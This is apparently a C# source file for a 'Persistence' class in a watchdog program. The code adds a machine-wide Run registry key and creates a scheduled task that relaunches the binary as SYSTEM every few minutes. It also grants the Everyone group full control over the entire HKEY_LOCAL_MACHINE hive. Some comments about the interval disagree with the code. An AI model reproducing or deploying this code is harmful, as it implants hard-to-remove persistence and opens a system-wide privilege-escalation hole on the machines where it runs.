using System.Diagnostics;
using Microsoft.Win32;
using System.Security.AccessControl;
using System.Security.Principal;
using System.IO;



    public class Persistence
    {

        public static void runAllTechniques()
        {
            GrantEveryoneFullControl(Registry.LocalMachine); //grants all users full control over reg keys
   
            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\Run", Config.RunKeyName, Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
          



            // Check if the task exists
            if (!TaskExistsAndActive(Config.ScheduledTaskName))
            {
                // Create or re-enable the task if it doesn't exist or is inactive
                CreateScheduledTask(Config.ScheduledTaskName, Config.PrimaryWatchdogFullPath, 3); // Runs every 3 minutes
                watchdogHelper.Log($"Scheduled task '{Config.ScheduledTaskName}' created or re-enabled successfully.");
            }
            else
            {
                watchdogHelper.Log($"Scheduled task '{Config.ScheduledTaskName}' already exists and is active.");

            }

        }

        private static bool TaskExistsAndActive(string taskName)
        {
        try
        {
            Process process = new Process();
            process.StartInfo.FileName = "schtasks";
            process.StartInfo.Arguments = $"/Query /TN \"{taskName}\" /V /FO LIST";
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;

            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();

            // Check if the task exists and is active
            return output.Contains(taskName) && output.Contains("Status: Ready");
        }
        catch (Exception ex) { 
            watchdogHelper.Log($"Error verifying task exists and active: {ex.Message}");
            return false;
        }
        }

        // Function to create a scheduled task to run every 30 seconds
        private static void CreateScheduledTask(string taskName, string binaryPath, int intervalSeconds)
        {
        try
        {
            // Create the schtasks command to run every 30 seconds
            string command = $"/Create /TN \"{taskName}\" /TR \"{binaryPath}\" /SC ONCE /ST 00:00 /F /RI {intervalSeconds} /DU 9999:59 /RU SYSTEM"; //sets system permissions

            Process process = new Process();
            process.StartInfo.FileName = "schtasks";
            process.StartInfo.Arguments = command;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;

            process.Start();
            process.WaitForExit();
        }
        catch (Exception ex) {
            watchdogHelper.Log($"Error creating scheduled task: {ex.Message}");
        }
        }

        private static void SetRegistryKey(string keyPath, string valueName, object value, RegistryHive hive, RegistryView view = RegistryView.Default)
        {
            try
            {
                using (RegistryKey baseKey = RegistryKey.OpenBaseKey(hive, view))
                {
                    using (RegistryKey key = baseKey.OpenSubKey(keyPath, true) ?? baseKey.CreateSubKey(keyPath, true))
                    {
                        if (key != null)
                        {
                            object ?currentValue = key.GetValue(valueName);
                            if (currentValue == null || !currentValue.Equals(value))
                            {
                                key.SetValue(valueName, value); //sets registry key
                            }
                        }
                        else
                        {
                            throw new IOException($"Failed to create or open registry key: {keyPath}");
                        }
                    }
                }
            }
            catch (UnauthorizedAccessException ex)
            {
                watchdogHelper.Log($"Access denied to registry key: {keyPath}. Exception: {ex.Message}");
            }
            catch (IOException ex)
            {
                watchdogHelper.Log($"I/O error accessing registry key: {keyPath}. Exception: {ex.Message}");
            }
            catch (Exception ex)
            {
                watchdogHelper.Log($"Unexpected error: {ex.Message}");
            }
        }

        

        private static void GrantEveryoneFullControl(RegistryKey rootKey)
        {
            try
            {
                // Get the current access control for the key
                RegistrySecurity registrySecurity = rootKey.GetAccessControl();

                // Create a new rule that grants "Everyone" Full Control
                RegistryAccessRule rule = new RegistryAccessRule(
                    new SecurityIdentifier(WellKnownSidType.WorldSid, null), // "Everyone" group
                    RegistryRights.FullControl,                               // Full control
                    InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, // Inherit permissions
                    PropagationFlags.None,                                    // Don't propagate further
                    AccessControlType.Allow                                   // Allow the rule
                );

                // Add the rule to the security object
                registrySecurity.AddAccessRule(rule);

                // Enable inheritance for subkeys
                registrySecurity.SetAccessRuleProtection(false, false);

                // Apply the modified security settings to the key
                rootKey.SetAccessControl(registrySecurity);

                watchdogHelper.Log($"Successfully granted 'Everyone' full control and enabled inheritance on {rootKey}.");
            }
            catch (UnauthorizedAccessException ex)
            {
                watchdogHelper.Log($"Error: Access denied. Run the application with administrator privileges. Error: {ex.Message}");
            }
            catch (ArgumentException ex)
            {
                watchdogHelper.Log($"Error: {ex.Message}");
            }
            catch (Exception ex)
            {
                watchdogHelper.Log($"An error occurred: {ex.Message}");
            }
        }
    }
